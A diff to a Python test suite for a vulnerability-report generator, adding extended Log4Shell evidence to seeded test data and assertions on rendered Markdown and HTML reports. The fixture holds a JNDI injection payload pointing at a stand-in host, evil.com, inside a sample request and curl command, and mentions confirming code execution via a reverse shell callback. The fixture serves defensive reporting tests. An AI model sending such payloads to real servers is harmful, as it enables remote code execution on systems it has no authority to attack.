@@ -73,7 +73,23 @@ async def _seed(actor: str = "local") -> str:
             session, actor, asset_id=asset.id, service_id=svc.id,
             severity="critical", category="cve", title="Log4Shell",
             cve_id="CVE-2021-44228", discovered_by="nuclei-template-scan",
-            evidence={"summary": "RCE on /api"},
+            evidence={
+                "summary": "RCE on /api",
+                "matched_at": "http://10.0.0.5:8080/api/login",
+                "request": "POST /api/login HTTP/1.1\nHost: 10.0.0.5:8080\nContent-Type: application/json\n\n{\"user\":\"${jndi:ldap://evil.com/exploit}\"}",
+                "response": "HTTP/1.1 500 Internal Server Error\n\nError processing JNDI lookup",
+                "curl_command": "curl -X POST http://10.0.0.5:8080/api/login -d '{\"user\":\"${jndi:ldap://evil.com/exploit}\"}'",
+                "verification_steps": [
+                    "Send POST request to /api/login with JNDI payload",
+                    "Check server logs for outbound LDAP connection",
+                    "Confirm RCE via reverse shell callback",
+                ],
+                "remediation": "Upgrade Log4j to 2.17.0+ and set log4j2.formatMsgNoLookups=true",
+                "references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+                    "https://logging.apache.org/log4j/2.x/security.html",
+                ],
+            },
             raw_log_path="/tmp/raw/nuclei.jsonl",
         )
         await upsert_vulnerability(
@@ -119,6 +135,15 @@ async def test_render_markdown_contains_key_fields(cmdb_engine):
     assert "CVE-2021-44228" in md
     assert "10.0.0.5" in md
     assert "| 严重 | 1 |" in md
+    # New fields
+    assert "验证步骤" in md
+    assert "Send POST request to /api/login with JNDI payload" in md
+    assert "证据详情" in md
+    assert "修复建议" in md
+    assert "Upgrade Log4j to 2.17.0+" in md
+    assert "参考资料" in md
+    assert "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" in md
+    assert "http://10.0.0.5:8080/api/login" in md
 
 
 async def test_render_html_inlines_severity_badges(cmdb_engine):
@@ -131,6 +156,40 @@ async def test_render_html_inlines_severity_badges(cmdb_engine):
     assert "Log4Shell" in html
     assert "开放服务" in html
     assert "<td>22</td><td>tcp</td><td>ssh</td><td>OpenSSH</td><td>8.4</td>" in html
+    # New finding card fields
+    assert "finding-card" in html
+    assert "验证步骤" in html
+    assert "Send POST request to /api/login with JNDI payload" in html
+    assert "证据详情" in html
+    assert "修复建议" in html
+    assert "Upgrade Log4j to 2.17.0+" in html
+    assert "参考资料" in html
+    assert "http://10.0.0.5:8080/api/login" in html
+    assert "pre.evidence" in html or 'class="evidence"' in html
+
+
+async def test_builder_extracts_extended_evidence_fields(cmdb_engine):
+    """build_report_model must populate the new ReportFinding fields."""
+    scan_id = await _seed()
+    async with cmdb_db.get_session() as session:
+        model = await build_report_model(session, scan_id)
+    # Find the Log4Shell finding
+    log4shell = None
+    for asset in model.assets:
+        for f in asset.findings:
+            if f.title == "Log4Shell":
+                log4shell = f
+                break
+    assert log4shell is not None
+    assert log4shell.affected_url == "http://10.0.0.5:8080/api/login"
+    assert log4shell.evidence_summary == "RCE on /api"
+    assert len(log4shell.verification_steps) == 3
+    assert "JNDI payload" in log4shell.verification_steps[0]
+    assert log4shell.remediation is not None
+    assert "Log4j" in log4shell.remediation
+    assert len(log4shell.references) == 2
+    assert log4shell.evidence_detail is not None
+    assert "POST /api/login" in log4shell.evidence_detail
 
 
 # ---------------------------------------------------------------------------
